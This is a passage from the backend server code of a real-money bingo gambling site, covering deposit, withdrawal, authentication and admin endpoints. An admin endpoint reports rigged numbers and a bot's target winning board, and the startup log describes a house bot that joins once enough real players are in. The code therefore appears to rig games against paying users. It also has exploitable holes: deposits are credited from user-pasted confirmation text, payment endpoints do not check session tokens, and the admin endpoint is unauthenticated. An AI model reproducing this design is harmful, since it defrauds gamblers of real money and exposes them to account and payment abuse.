      return res.json({ success: false, error: 'Missing required fields' });
    }

    if (!userIdToUsername.has(userId)) {
      return res.json({ success: false, error: 'Invalid user' });
    }

    const amountNum = Number(amount);
    if (!Number.isFinite(amountNum) || amountNum <= 0) {
      return res.json({ success: false, error: 'Invalid amount' });
    }

    if (transactionIds.has(transactionId)) {
      return res.json({ success: false, error: 'This transaction ID has already been used' });
    }

    const msgNoSpaces = message.replace(/\s+/g, '');
    const accountNoSpaces = account.replace(/\s+/g, '');
    if (!msgNoSpaces.includes(accountNoSpaces)) {
      return res.json({ success: false, error: 'Account number not found in confirmation message' });
    }

    const detectedAmount = parseAmount(message);
    if (!detectedAmount || Math.abs(detectedAmount - amountNum) > 0.01) {
      return res.json({
        success: false,
        error: `Amount mismatch. Expected: ${amountNum} Birr, Found: ${detectedAmount || 'N/A'} Birr`
      });
    }

    const currentBalance = userBalances.get(userId) || 0;
    userBalances.set(userId, currentBalance + amountNum);
    transactionIds.add(transactionId);

    const playerSocket = Array.from(io.sockets.sockets.values()).find(s => s.userId === userId);
    if (playerSocket) {
      playerSocket.emit('balance_update', { balance: userBalances.get(userId) });
    }

    console.log(`Deposit processed: User ${userId}, Amount: ${amountNum}, TxnID: ${transactionId}`);

    res.json({
      success: true,
      balance: userBalances.get(userId),
      message: 'Deposit verified and processed successfully'
    });
  } catch (error) {
    console.error('Deposit error:', error);
    res.json({ success: false, error: 'Server error processing deposit' });
  }
});

// Withdrawal request
app.post('/api/withdrawal', (req, res) => {
  try {
    const { userId, amount, account } = req.body;

    if (!userId || !amount || !account) {
      return res.json({ success: false, error: 'Missing required fields' });
    }

    if (!userIdToUsername.has(userId)) {
      return res.json({ success: false, error: 'Invalid user' });
    }

    const amountNum = Number(amount);
    if (!Number.isFinite(amountNum) || amountNum <= 0) {
      return res.json({ success: false, error: 'Invalid amount' });
    }

    const currentBalance = userBalances.get(userId) || 0;
    if (amountNum > currentBalance) {
      return res.json({ success: false, error: 'Insufficient balance' });
    }

    withdrawalRequests.set(userId, {
      amount: amountNum,
      account: account,
      timestamp: Date.now()
    });

    userBalances.set(userId, currentBalance - amountNum);

    const playerSocket = Array.from(io.sockets.sockets.values()).find(s => s.userId === userId);
    if (playerSocket) {
      playerSocket.emit('balance_update', { balance: userBalances.get(userId) });
    }

    console.log(`Withdrawal requested: User ${userId}, Amount: ${amountNum}, Account: ${account}`);

    res.json({
      success: true,
      balance: userBalances.get(userId),
      message: 'Withdrawal request processed. Please check your account and paste the confirmation message.'
    });
  } catch (error) {
    console.error('Withdrawal error:', error);
    res.json({ success: false, error: 'Server error processing withdrawal' });
  }
});

// Withdrawal verify
app.post('/api/withdrawal/verify', (req, res) => {
  try {
    const { userId, amount, account, message, transactionId } = req.body;

    if (!userId || !amount || !message || !transactionId) {
      return res.json({ success: false, error: 'Missing required fields' });
    }

    if (!userIdToUsername.has(userId)) {
      return res.json({ success: false, error: 'Invalid user' });
    }

    const amountNum = Number(amount);

    const detectedAmount = parseAmount(message);
    if (!detectedAmount || Math.abs(detectedAmount - amountNum) > 0.01) {
      return res.json({
        success: false,
        error: `Amount mismatch. Expected: ${amountNum} Birr, Found: ${detectedAmount || 'N/A'} Birr`
      });
    }

    const detectedTxnId = parseTransactionId(message);
    if (!detectedTxnId || detectedTxnId !== transactionId.toUpperCase()) {
      return res.json({ success: false, error: 'Transaction ID mismatch' });
    }

    if (transactionIds.has(transactionId.toUpperCase())) {
      return res.json({ success: false, error: 'This transaction ID has already been used' });
    }

    const msgNoSpaces = message.replace(/\s+/g, '');
    const accountNoSpaces = account.replace(/\s+/g, '');
    if (!msgNoSpaces.includes(accountNoSpaces)) {
      return res.json({ success: false, error: 'Account number not found in confirmation message' });
    }

    transactionIds.add(transactionId.toUpperCase());
    withdrawalRequests.delete(userId);

    console.log(`Withdrawal verified: User ${userId}, Amount: ${amountNum}, TxnID: ${transactionId}`);

    res.json({
      success: true,
      message: 'Withdrawal verified successfully'
    });
  } catch (error) {
    console.error('Withdrawal verification error:', error);
    res.json({ success: false, error: 'Server error verifying withdrawal' });
  }
});

// Auth signup
app.post('/api/auth/signup', (req, res) => {
  try {
    const { username, password } = req.body;

    if (!username || !password) {
      return res.json({ success: false, error: 'Username and password required' });
    }

    const usernameLower = username.trim().toLowerCase();

    if (usernameLower.length < 3) {
      return res.json({ success: false, error: 'Username must be at least 3 characters' });
    }

    if (password.length < 6) {
      return res.json({ success: false, error: 'Password must be at least 6 characters' });
    }

    if (users.has(usernameLower)) {
      return res.json({ success: false, error: 'Username already exists' });
    }

    const oderId = crypto.randomBytes(16).toString('hex');
    const passwordHash = hashPassword(password);

    users.set(usernameLower, {
      oderId,
      passwordHash,
      createdAt: Date.now()
    });

    userIdToUsername.set(oderId, usernameLower);
    userBalances.set(oderId, 100); // Welcome bonus

    const token = generateToken();
    const expiresAt = Date.now() + (30 * 24 * 60 * 60 * 1000);
    userSessions.set(token, { userId: oderId, username: usernameLower, expiresAt });

    console.log(`User signed up: ${usernameLower} (${oderId}) -> Welcome bonus: 100 Birr`);

    res.json({
      success: true,
      userId: oderId,
      username: usernameLower,
      token,
      balance: 100,
    });
  } catch (error) {
    console.error('Signup error:', error);
    res.json({ success: false, error: 'Server error during signup' });
  }
});

// Auth login
app.post('/api/auth/login', (req, res) => {
  try {
    const { username, password } = req.body;

    if (!username || !password) {
      return res.json({ success: false, error: 'Username and password required' });
    }

    const usernameLower = username.trim().toLowerCase();
    const user = users.get(usernameLower);

    if (!user) {
      return res.json({ success: false, error: 'Invalid username or password' });
    }

    const passwordHash = hashPassword(password);
    if (user.passwordHash !== passwordHash) {
      return res.json({ success: false, error: 'Invalid username or password' });
    }

    const token = generateToken();
    const expiresAt = Date.now() + (30 * 24 * 60 * 60 * 1000);
    userSessions.set(token, { userId: user.oderId, username: usernameLower, expiresAt });

    if (!userBalances.has(user.oderId)) {
      userBalances.set(user.oderId, 0);
    }

    console.log(`User logged in: ${usernameLower} (${user.oderId})`);

    res.json({
      success: true,
      userId: user.oderId,
      username: usernameLower,
      token
    });
  } catch (error) {
    console.error('Login error:', error);
    res.json({ success: false, error: 'Server error during login' });
  }
});

// Auth verify
app.post('/api/auth/verify', (req, res) => {
  try {
    const { userId, token } = req.body;

    if (!userId || !token) {
      return res.json({ success: false });
    }

    const session = userSessions.get(token);

    if (!session || session.userId !== userId) {
      return res.json({ success: false });
    }

    if (session.expiresAt < Date.now()) {
      userSessions.delete(token);
      return res.json({ success: false });
    }

    const username = userIdToUsername.get(userId);
    if (!username) {
      return res.json({ success: false });
    }

    res.json({ success: true, username });
  } catch (error) {
    console.error('Verify error:', error);
    res.json({ success: false });
  }
});

// Get bet houses status
app.get('/api/bet-houses', (_req, res) => {
  res.json({ success: true, betHouses: getAllBetHousesStatus() });
});

// Admin bot status (for monitoring)
app.get('/api/admin/bot-status', (_req, res) => {
  const status = {};
  AVAILABLE_STAKES.forEach(stake => {
    const state = getGameState(stake);
    status[stake] = {
      botActive: state.botActive,
      realPlayerBoards: getRealPlayerBoardCount(state),
      totalBoards: getTotalSelectedBoards(state),
      phase: state.phase,
      hasRiggedNumbers: !!state.riggedNumbers,
      botTargetBoard: state.botTargetWin?.boardId || null
    };
  });
  res.json({ success: true, botStatus: status });
});

// Root endpoint
app.get('/', (_req, res) => {
  res.json({
    message: 'Win Bingo server running',
    betHouses: getAllBetHousesStatus()
  });
});

// Session cleanup
setInterval(() => {
  const now = Date.now();
  for (const [token, session] of userSessions.entries()) {
    if (session.expiresAt < now) {
      userSessions.delete(token);
    }
  }
}, 60 * 60 * 1000);

// ==================== START SERVER ====================
const PORT = process.env.PORT || 3001;
server.listen(PORT, () => {
  console.log(`\n🎰 Win Bingo Server Started`);
  console.log(`📍 Port: ${PORT}`);
  console.log(`🤖 Admin Bot: Active (${ADMIN_BOT_BOARD_COUNT} boards, triggers at ${MIN_REAL_BOARDS_FOR_BOT}-${MAX_REAL_BOARDS_FOR_BOT} real boards)`);
  console.log(`🎲 Available Stakes: ${AVAILABLE_STAKES.join(', ')} Birr\n`);
  
  // Start countdown for all bet houses
  AVAILABLE_STAKES.forEach(stake => {
    const state = getGameState(stake);
    if (!state.timer && state.phase === 'lobby') {
      startCountdown(stake);
    }
  });
}).on('error', (err) => {
  if (err.code === 'EADDRINUSE') {
    console.error(`\n❌ Error: Port ${PORT} is already in use!`);
    process.exit(1);
  } else {
    console.error('Server error:', err);
    process.exit(1);
  }
});